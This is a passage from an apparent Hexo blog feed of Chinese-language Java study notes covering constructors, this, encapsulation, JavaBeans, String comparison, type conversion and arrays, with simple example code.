        <content type="html"><![CDATA[<h2 id="一、构造器和this关键字"><a href="#一、构造器和this关键字" class="headerlink" title="一、构造器和this关键字"></a>一、构造器和this关键字</h2><h3 id="1、构造器"><a href="#1、构造器" class="headerlink" title="1、构造器"></a>1、构造器</h3><p>Java类中自带构造器，实际是一个类同名的方法，默认参数为空，想指定参数需要重写。</p><p>Java构造器类似Python的构造函数，都是在初始化类时调用，不同的是Java可以同时存在有参和无参两个构造器。</p><p>指定参数后想再次使用无参构造器，需要声明一个无参的。</p><h3 id="2、this关键字"><a href="#2、this关键字" class="headerlink" title="2、this关键字"></a>2、this关键字</h3><p>this关键字代表当前对象本身的地址，类似于Python的self：</p><ul><li>  Java：this.name</li><li>  Python：self.name</li></ul><h3 id="3、示例"><a href="#3、示例" class="headerlink" title="3、示例"></a>3、示例</h3><p>Person类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">double</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无参构造器，默认存在</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;！无参构造器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 有参构造器，需自定义</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">double</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;！有参构造器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person user1 = <span class="keyword">new</span> Person();</span><br><span class="line">        System.out.println(<span class="string">&quot;姓名：&quot;</span> + user1.name);</span><br><span class="line">        System.out.println(<span class="string">&quot;年龄：&quot;</span> + user1.age);</span><br><span class="line"></span><br><span class="line">        Person user2 = <span class="keyword">new</span> Person(<span class="string">&quot;张三&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;姓名：&quot;</span> + user2.name);</span><br><span class="line">        System.out.println(<span class="string">&quot;年龄：&quot;</span> + user2.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20211231000340329.png" alt="image-20211231000340329"></p><h2 id="二、封装"><a href="#二、封装" class="headerlink" title="二、封装"></a>二、封装</h2><h3 id="1、封装概念"><a href="#1、封装概念" class="headerlink" title="1、封装概念"></a>1、封装概念</h3><p>面向对象的三大特征：封装、继承、多态。</p><p>为了防止类成员变量被直接外部调用操作，一般将成员变量设定为private私有类型，不暴漏在外，定义对外的setter和getter方法来对其操作，在setter和getter方法中写入相关合法判断，用户在进行存取数据时，只需要调用setter和getter方法即可。</p><p>好处：增强代码的安全性、提高开发效率。</p><h3 id="2、示例"><a href="#2、示例" class="headerlink" title="2、示例"></a>2、示例</h3><p>Person类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//setter</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">double</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (age &gt;= <span class="number">0</span> &amp;&amp; age &lt;= <span class="number">150</span>)&#123;</span><br><span class="line">            <span class="keyword">this</span>.age = age;</span><br><span class="line">            System.out.println(<span class="string">&quot;年龄合法&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;年龄不合法&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//getter</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Main类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person user1 = <span class="keyword">new</span> Person();</span><br><span class="line">        user1.setAge(<span class="number">20</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;年龄：&quot;</span> + user1.getAge());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;-----&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Person user2 = <span class="keyword">new</span> Person();</span><br><span class="line">        user2.setAge(<span class="number">200</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;年龄：&quot;</span> + user2.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20211231003519864.png" alt="image-20211231003519864"></p><h2 id="三、JavaBean"><a href="#三、JavaBean" class="headerlink" title="三、JavaBean"></a>三、JavaBean</h2><h3 id="1、概念"><a href="#1、概念" class="headerlink" title="1、概念"></a>1、概念</h3><p>JavaBean可以理解为实体类，可用于存取数据、封装数据，一个实体类必须包含以下三要素：</p><ol><li> 必须提供一个无参构造器（有参看需求）</li><li> 成员变量私有（private修饰）</li><li> 每个成员变量都有对应的setXxx()和getXxx()方法来供外部操作</li></ol><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220101175029264.png" alt="image-20220101175029264"></p><p>IDEA中可快捷生成相关代码。</p><h3 id="2、示例-1"><a href="#2、示例-1" class="headerlink" title="2、示例"></a>2、示例</h3><p>标准实体类：Person类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Double age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无参构造器</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 有参构造器（可选）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, Double age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Double <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Double age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四、String类"><a href="#四、String类" class="headerlink" title="四、String类"></a>四、String类</h2><h3 id="1、常见几种对象创建方式"><a href="#1、常见几种对象创建方式" class="headerlink" title="1、常见几种对象创建方式"></a>1、常见几种对象创建方式</h3><h4 id="1）String-s1-quot-quot"><a href="#1）String-s1-quot-quot" class="headerlink" title="1）String s1 = &quot; &quot;"></a>1）<code>String s1 = &quot; &quot;</code></h4><h4 id="2）String-s2-new-String-quot-quot"><a href="#2）String-s2-new-String-quot-quot" class="headerlink" title="2）String s2 = new String(&quot; &quot;)"></a>2）<code>String s2 = new String(&quot; &quot;)</code></h4><h4 id="3）字符数组自动合并为字符串"><a href="#3）字符数组自动合并为字符串" class="headerlink" title="3）字符数组自动合并为字符串"></a>3）字符数组自动合并为字符串</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>[] c1 = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line">String s5 = <span class="keyword">new</span> String(c1);</span><br></pre></td></tr></table></figure><h4 id="4）-byte字节型自动转为字符，再合并为字符串"><a href="#4）-byte字节型自动转为字符，再合并为字符串" class="headerlink" title="4） byte字节型自动转为字符，再合并为字符串"></a>4） byte字节型自动转为字符，再合并为字符串</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] byte1 = &#123;<span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>&#125;;</span><br><span class="line">String s6 = <span class="keyword">new</span> String(byte1);</span><br></pre></td></tr></table></figure><h3 id="2、String类型变量对比"><a href="#2、String类型变量对比" class="headerlink" title="2、String类型变量对比"></a>2、String类型变量对比</h3><h4 id="1）”-“创建的String变量之间的对比"><a href="#1）”-“创建的String变量之间的对比" class="headerlink" title="1）” “创建的String变量之间的对比"></a>1）” “创建的String变量之间的对比</h4><p>“ ”创建的变量，变量存储的是常量在堆内存中的地址，同样的常量，常量池中只存在一个，因此两个变量地址相同</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220102231232012.png" alt="image-20220102231232012"></p><h4 id="2）new-String创建的String变量之间的对比"><a href="#2）new-String创建的String变量之间的对比" class="headerlink" title="2）new String创建的String变量之间的对比"></a>2）new String创建的String变量之间的对比</h4><p>两个new String创建两个字符串对象，地址不同</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220102233225918.png" alt="image-20220102233225918"></p><h4 id="3）”-“和new-String创建的String变量之间的对比"><a href="#3）”-“和new-String创建的String变量之间的对比" class="headerlink" title="3）” “和new String创建的String变量之间的对比"></a>3）” “和new String创建的String变量之间的对比</h4><p>“ ”创建的变量存的常量地址，new String创建字符串对象，变量存的字符串对象地址，两个地址不同</p><h3 id="4）equals"><a href="#4）equals" class="headerlink" title="4）equals()"></a>4）equals()</h3><p>equals()方法只对比变量内容</p><h3 id="4、示例"><a href="#4、示例" class="headerlink" title="4、示例"></a>4、示例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* String类使用示例：</span></span><br><span class="line"><span class="comment">*   1、几种常用的创建方式</span></span><br><span class="line"><span class="comment">*   2、String类操作API</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StringDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String s1 = <span class="string">&quot;示例&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第一张创建方式（常用）</span></span><br><span class="line">        String s2 = <span class="string">&quot;示例&quot;</span>;</span><br><span class="line">        <span class="comment">// 返回true：“ ”创建的变量，变量存储的是常量在堆内存中的地址，同样的常量，常量池中只存在一个，因此地址相同</span></span><br><span class="line">        System.out.println(s1 == s2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二种创建方式（不常用）</span></span><br><span class="line">        String s3 = <span class="keyword">new</span> String(<span class="string">&quot;示例&quot;</span>);</span><br><span class="line">        <span class="comment">// 返回false：“ ”创建的变量存的常量地址，new String创建字符串对象，变量存的字符串对象地址，两个地址不同</span></span><br><span class="line">        System.out.println(s1 == s3);</span><br><span class="line"></span><br><span class="line">        String s4 = <span class="keyword">new</span> String(<span class="string">&quot;示例&quot;</span>);</span><br><span class="line">        <span class="comment">// 返回false：两个new String创建两个字符串对象，地址不同</span></span><br><span class="line">        System.out.println(s3 == s4);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 字符数组自动合并为字符串</span></span><br><span class="line">        <span class="keyword">char</span>[] c1 = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line">        String s5 = <span class="keyword">new</span> String(c1);</span><br><span class="line">        System.out.println(<span class="string">&quot;s5: &quot;</span> + s5);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// byte字节型自动转为字符，再合并为字符串</span></span><br><span class="line">        <span class="keyword">byte</span>[] byte1 = &#123;<span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>&#125;;</span><br><span class="line">        String s6 = <span class="keyword">new</span> String(byte1);</span><br><span class="line">        System.out.println(<span class="string">&quot;s6: &quot;</span> + s6);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回true：equals()方法只对比变量内容</span></span><br><span class="line">        System.out.println(s3.equals(s4));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220102235307192.png" alt="image-20220102235307192"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java学习之路 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Java学习之路】SE1 - 基本概念及语法</title>
      <link href="post/202110252133.html"/>
      <url>post/202110252133.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、基础概念"><a href="#一、基础概念" class="headerlink" title="一、基础概念"></a>一、基础概念</h2><h3 id="1、JDK、JRE关系"><a href="#1、JDK、JRE关系" class="headerlink" title="1、JDK、JRE关系"></a>1、JDK、JRE关系</h3><p><strong>总：</strong>JDK包含JRE、JRE包含JVM</p><p>JDK（Java Development Kitchen）：Java开发工具，包括java编译器、java虚拟机、java类库等java开发运行所需的所有东西</p><p>JRE（Java Runtime Environment）：Java运行环境，包含java虚拟机JVM和java类库</p><p>JVM（Java Virtual Machine）：Java虚拟机，跨平台支持基础，真正运行java程序的地方</p><p><strong>结：</strong></p><p>1、安装JDK即表示安装了Java开发运行所需的所有环境</p><p>2、如果是企业部署情况下，可能不需要开发环境，因此只需安装JRE能够至此java项目运行即可</p><h3 id="2、java程序运行过程"><a href="#2、java程序运行过程" class="headerlink" title="2、java程序运行过程"></a>2、java程序运行过程</h3><p><strong>总：</strong>javac将.java文件编译成.class文件，java运行.class文件</p><p>安装好的JDK中包含一个java.exe和javac.exe，javac.exe用于将.java文件编译成跨平台的.class文件，java.exe将.class文件转换为机器码并执行。</p><p>简单的java程序，HelloWorld.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cmd中执行以下命令运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac HelloWorld.java</span><br><span class="line">java HelloWorld</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;HelloWorld</span></span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202110250054215.png" alt="image-20211023180240166"></p><h2 id="二、基本语法"><a href="#二、基本语法" class="headerlink" title="二、基本语法"></a>二、基本语法</h2><h3 id="1、类型转换"><a href="#1、类型转换" class="headerlink" title="1、类型转换"></a>1、类型转换</h3><h4 id="自动类型转换"><a href="#自动类型转换" class="headerlink" title="自动类型转换"></a>自动类型转换</h4><p>小范围类型的变量，可以直接直接复制给大范围的变量，以下遍历自动向下转换，可跨级</p><ul><li>byte:1字节</li><li>short:2字节、char:1字节</li><li>int:4字节</li><li>long:8字节</li><li>float:4字节</li><li>short:8字节</li></ul><p>底层原理：小范围变量转换成2进制填到目标进制二进制后，目标进制变量前边其余位填充0</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202110250054705.png" alt="screen_2021-10-23_21-20-46"></p><p>代码块：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*自动类型转换*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Type</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*1、自动类型转换*/</span></span><br><span class="line">        autoTypeConversion();</span><br><span class="line">        <span class="comment">/*2、表达式中的自动类型转换*/</span></span><br><span class="line">        autoTypeConversionInExpression();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*1、自动类型转换:</span></span><br><span class="line"><span class="comment">    * 小范围类型的变量，可以直接直接复制给大范围的变量*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">autoTypeConversion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;自动类型转换输出：&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span> a = <span class="number">127</span>;</span><br><span class="line">        <span class="keyword">int</span> b = a;</span><br><span class="line">        <span class="keyword">float</span> f = b;</span><br><span class="line">        <span class="keyword">char</span> c = <span class="string">&#x27;v&#x27;</span>; <span class="comment">//单引号char类型，双引号String类型</span></span><br><span class="line">        <span class="keyword">int</span> d = c;</span><br><span class="line">        System.out.println(<span class="string">&quot;b: &quot;</span> + b); <span class="comment">//输出127</span></span><br><span class="line">        System.out.println(<span class="string">&quot;f: &quot;</span> + f); <span class="comment">//输出127.0</span></span><br><span class="line">        System.out.println(<span class="string">&quot;d: &quot;</span> + d); <span class="comment">//输出v的ascii值</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*2、表达式中的自动类型转换</span></span><br><span class="line"><span class="comment">     * 1)小范围会自动转换为大范围后再运行</span></span><br><span class="line"><span class="comment">     * 2)表达式中byte、char、short是直接转换成int后再参与运算的</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">autoTypeConversionInExpression</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;表达式中的自动类型转换输出：&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span> a = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">byte</span> b = <span class="number">20</span>;</span><br><span class="line"><span class="comment">//        byte c = a + b; 报错</span></span><br><span class="line">        <span class="keyword">int</span> c = a + b; <span class="comment">//30</span></span><br><span class="line">        <span class="keyword">float</span> d = a + b; <span class="comment">//30.0</span></span><br><span class="line">        System.out.printf(<span class="string">&quot;c: %d\nd: %s&quot;</span>, c, d);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a><strong>强制类型转换</strong></h4><p>语法：<code>数据类型 变量2 = (数据类型) 变量1</code></p><p>底层原理：以int -&gt; byte为例，将int的二进制后8位，直接放在byte的8位二进制上</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202110250055072.png" alt="screen_2021-10-23_21-39-03"></p><p>代码块：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*3、强制类型转换</span></span><br><span class="line"><span class="comment">* 以int -&gt; byte为例，将int的二进制后8位，直接放在byte的8位上</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">forceTypeConversion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;强制类型转换输出：&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">byte</span> c = (<span class="keyword">byte</span>)a; <span class="comment">//输出10</span></span><br><span class="line">    <span class="keyword">byte</span> d = (<span class="keyword">byte</span>)b; <span class="comment">//输出-24</span></span><br><span class="line">    System.out.printf(<span class="string">&quot;c: %d\nd: %s\n&quot;</span>, c, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：强制；类型转换可能造成数据溢出（丢失）</p><h3 id="2、数组"><a href="#2、数组" class="headerlink" title="2、数组"></a>2、数组</h3><h4 id="静态定义"><a href="#静态定义" class="headerlink" title="静态定义"></a>静态定义</h4><p>完整版：<code>int[] a = new int[]&#123;1， 2， 3， 4&#125;;</code></p><p>简化版：<code>int[] a = &#123;1, 2, 3, 4&#125;;</code></p><p>可见其实数组是一个对象。</p><h4 id="动态定义及访问"><a href="#动态定义及访问" class="headerlink" title="动态定义及访问"></a><strong>动态定义及访问</strong></h4><p><code>int[] a = new int[10];</code></p><p>访问并赋值代码块：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sma11new.array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Array</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span>[] a = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">            System.out.printf(<span class="string">&quot;输入第%d位学生年龄：&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">            a[i] = scan.nextInt();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.length; i++)&#123;</span><br><span class="line">            System.out.printf(<span class="string">&quot;第%d位学生年龄：%d\n&quot;</span>, i + <span class="number">1</span>, a[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202110250055800.png" alt="image-20211023230701414"></p><h4 id="数组内存分配"><a href="#数组内存分配" class="headerlink" title="数组内存分配"></a>数组内存分配</h4><p>Java内存分为以下：</p><ul><li>  <strong>栈</strong>：方法运行时所进入的内存，变量也是存在这里 </li><li>  <strong>堆</strong>：new出来的对象会存在此内存空间</li><li>  <strong>方法区</strong>：字节码文件加载时进入的内存空间（class文件）</li><li>  本地方法栈</li><li>  寄存器</li></ul><p>定义数组变量时在堆区申请连续空间，栈区的变量存的是数组在堆区的首地址，因此多个变量接收同一数组时，接收的是数组地址。</p><h3 id="3、方法重载"><a href="#3、方法重载" 